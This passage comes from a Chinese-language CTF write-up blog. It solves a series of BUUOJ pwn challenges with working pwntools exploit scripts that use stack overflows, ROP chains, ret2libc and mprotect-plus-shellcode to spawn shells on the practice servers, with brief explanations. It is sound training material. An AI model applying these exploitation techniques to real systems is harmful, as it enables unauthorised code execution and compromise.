class="number">0.5</span>);</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(get_flag))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后在网上看wp时发现有师傅用mprotect函数打，于是学习了一波。</p><p><code>int mprotect(const void *start, size_t len, int prot);</code></p><blockquote><p>start：我们要操作的地址，必须是一个内存页的起始地址，页大小的整数倍</p><p>len：地址往后的长度，最好为页大小整数倍</p><p>prot：权限，且prot=7 时是可读可写可执行。可以取以下几个值，并可以用<code>|</code>将几个属性结合起来使用：<br>1）PROT_READ：内存段可读；<br>2）PROT_WRITE：内存段可写；<br>3）PROT_EXEC：内存段可执行；<br>4）PROT_NONE：内存段不可访问。</p><p>mprotect函数将start开始长度为len的内存区的保护属性修改为prot指定的值。</p><p>返回值：0；成功，-1；失败（并且errno被设置）</p></blockquote><p>我们的方法就是借助这个函数，将一段地址的权限修改为可读可写可执行，在这段地址上写入shellcode，然后控制eip到这段地址，从而执行shellcode。</p><p><img src="https://i.loli.net/2021/06/02/mZtjv3l4cdQXkW8.png" alt="image-20210602223401046"></p><p>我们选择<code>0x80ea000</code>这段地址，len为1000。</p><p>然后通过pop参数返回到read函数。</p><p><img src="https://i.loli.net/2021/06/02/UJ5sHBMKfn2OwlT.png" alt="image-20210602224017706"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">pop_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(pop_ret)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也可以跳到main函数执行两次，不过好像远程打不通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">main=<span class="number">0x08048A20</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(main)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">payload=p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="3-ciscn-2019-n-8"><a href="#3-ciscn-2019-n-8" class="headerlink" title="3.ciscn_2019_n_8"></a>3.ciscn_2019_n_8</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_n_8">ciscn_2019_n_8</a></p><p>保护全开</p><p><img src="https://i.loli.net/2021/06/08/kHXZWBFr3vgCSVQ.png"></p><p>代码逻辑就是让我们输入的<code>var[13]=17</code>就行。</p><p><img src="https://i.loli.net/2021/06/08/nXwO5ujk19xiPLE.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29984</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="number">14</span>*p32(<span class="number">17</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="4-ciscn-2019-en-2"><a href="#4-ciscn-2019-en-2" class="headerlink" title="4.ciscn_2019_en_2"></a>4.ciscn_2019_en_2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_en_2">ciscn_2019_en_2</a></p><p><img src="https://i.loli.net/2021/06/08/hfSY53n2H84AUu6.png" alt="image-20210608220131354"></p><p>这个题跟ciscn_2019_c_1一模一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25728</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/08/wqjD8GiI36grMm4.png" alt="image-20210608234859415"></p><p>执行后会让你选择libc库，都试试就行了。本地打不通是因为libc版本不同。</p><h1 id="5-jarvisoj-level2"><a href="#5-jarvisoj-level2" class="headerlink" title="5.jarvisoj_level2"></a>5.jarvisoj_level2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/level2">jarvisoj_level2</a></p><p>简单的栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/09/EGfAIU56mQCvYKg.png" alt="image-20210609190158004"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27251</span>)</span><br><span class="line">bin_sh=<span class="number">0x0804A024</span></span><br><span class="line">system_addr=<span class="number">0x08048320</span></span><br><span class="line">ret_addr=<span class="number">0x08048480</span> </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(ret_addr)+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="6-not-the-same-3dsctf-2016"><a href="#6-not-the-same-3dsctf-2016" class="headerlink" title="6.not_the_same_3dsctf_2016"></a>6.not_the_same_3dsctf_2016</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/not_the_same_3dsctf_2016">not_the_same_3dsctf_2016</a></p><p><code>shift+f12</code></p><p><img src="https://i.loli.net/2021/06/09/nWhNmLUbpPJC45K.png" alt="image-20210609230819979"></p><p><code>ctrl+x</code>找到调用它的函数</p><p><img src="https://i.loli.net/2021/06/09/2xQOlcva5TNs8yt.png" alt="image-20210609230846505"></p><p><img src="https://i.loli.net/2021/06/09/QlVaHhw9UjLmy2W.png" alt="image-20210609230938208"></p><p><img src="https://i.loli.net/2021/06/09/OtHAv9BoFZigRUd.png" alt="image-20210609230948920"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27679</span>)</span><br><span class="line">get_secret=<span class="number">0x080489A0</span></span><br><span class="line">flag=<span class="number">0x080ECA2D</span></span><br><span class="line">write=<span class="number">0x0806E270</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(get_secret)+p32(write)+p32(<span class="number">0xdead</span>)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者用mprotect函数</p><p><img src="https://i.loli.net/2021/06/09/FWP14boGM6KuUHi.png" alt="image-20210609234313477"></p><p><img src="https://i.loli.net/2021/06/09/g5ItHsoUF6vhzRx.png" alt="image-20210609233228480"></p><p>基本上和上面那个get_started_3dsctf_2016一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29680</span>)</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">bss=<span class="number">0x80ea000</span></span><br><span class="line">ret3=<span class="number">0x08050b45</span></span><br><span class="line">read_addr=<span class="number">0x0806E200</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2D</span>+p32(mprotect)+p32(ret3)+p32(bss)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(bss)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="7-bjdctf-2020-babystack"><a href="#7-bjdctf-2020-babystack" class="headerlink" title="7.bjdctf_2020_babystack"></a>7.bjdctf_2020_babystack</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/bjdctf_2020_babystack">bjdctf_2020_babystack</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29095</span>)</span><br><span class="line">bin_sh=<span class="number">0x400858</span></span><br><span class="line">system=<span class="number">0x400590</span></span><br><span class="line">pop_rdi=<span class="number">0x400833</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>看wp发现有个后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29095</span>)</span><br><span class="line">backdoor=<span class="number">0x4006E6</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;200&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="8-安洵杯-2018-neko"><a href="#8-安洵杯-2018-neko" class="headerlink" title="8.安洵杯_2018_neko"></a>8.安洵杯_2018_neko</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/2018_neko">安洵杯_2018_neko</a></p><p>程序逻辑很简单，不细说了，输入<code>Yqwq</code>进入play函数，进行溢出通过libc拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25006</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;2018_neko&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">play=<span class="number">0x80486E7</span></span><br><span class="line">p.sendline(<span class="string">&quot;yQAQ&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies:\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">4</span>)+p32(puts_plt)+p32(play)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies?\n&quot;</span>)</span><br><span class="line">puts=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies:\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">4</span>)+p32(system)+p32(play)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="9-HarekazeCTF2019-baby-rop"><a href="#9-HarekazeCTF2019-baby-rop" class="headerlink" title="9.[HarekazeCTF2019]baby_rop"></a>9.[HarekazeCTF2019]baby_rop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/%5BHarekazeCTF2019%5Dbaby_rop">[HarekazeCTF2019]baby_rop</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29813</span>)</span><br><span class="line">system=<span class="number">0x400490</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">pop_rdi=<span class="number">0x400683</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag不在根目录，find找一下就行</p><p><img src="https://i.loli.net/2021/06/11/TowLHRe4xCVOQW9.png" alt="image-20210611140639621"></p><h1 id="10-jarvisoj-level2-x64"><a href="#10-jarvisoj-level2-x64" class="headerlink" title="10.jarvisoj_level2_x64"></a>10.jarvisoj_level2_x64</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/jarvisoj_level2_x64">jarvisoj_level2_x64</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29270</span>)</span><br><span class="line">system=<span class="number">0x4004C0</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">pop_rdi=<span class="number">0x4006b3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="11-ciscn-2019-n-5"><a href="#11-ciscn-2019-n-5" class="headerlink" title="11.ciscn_2019_n_5"></a>11.ciscn_2019_n_5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_n_5">ciscn_2019_n_5</a></p><p>2个思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25285</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25285</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;ciscn_2019_n_5&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400713</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">&quot;asjdlajsdkl&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main))</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;asjdlajsdkl&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot; me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="12-ciscn-2019-ne-5"><a href="#12-ciscn-2019-ne-5" class="headerlink" title="12.ciscn_2019_ne_5"></a>12.ciscn_2019_ne_5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_ne_5">ciscn_2019_ne_5</a></p><p><img src="https://i.loli.net/2021/06/14/S2GpzDv7LuorQtd.png" alt="image-20210614173216887"></p><p><img src="https://i.loli.net/2021/06/14/4hlwRWSD6oKQfts.png" alt="image-20210614173118814"></p><p>思路是AddLog函数的输入的值，在GetFlag的strcpy函数下可以溢出。</p><p><img src="https://i.loli.net/2021/06/14/cZpbxULluDnySw9.png" alt="image-20210614173257029"></p><p><img src="https://i.loli.net/2021/06/14/UvB4yMLEmsibZTG.png" alt="image-20210614173347120"></p><p>因为找不到<code>bin/sh</code>，然后通过师傅们的wp发现可以这么找。</p><p><img src="https://i.loli.net/2021/06/14/dWchJ79qpEye6Q8.png" alt="image-20210614173804217"></p><p>要注意，不正常退出会报错，所以记得找exit。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27017</span>)</span><br><span class="line">system=<span class="number">0x80484D0</span></span><br><span class="line">binsh=<span class="number">0x80482ea</span></span><br><span class="line">exit=<span class="number">0x80484E0</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system)+p32(exit)+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span 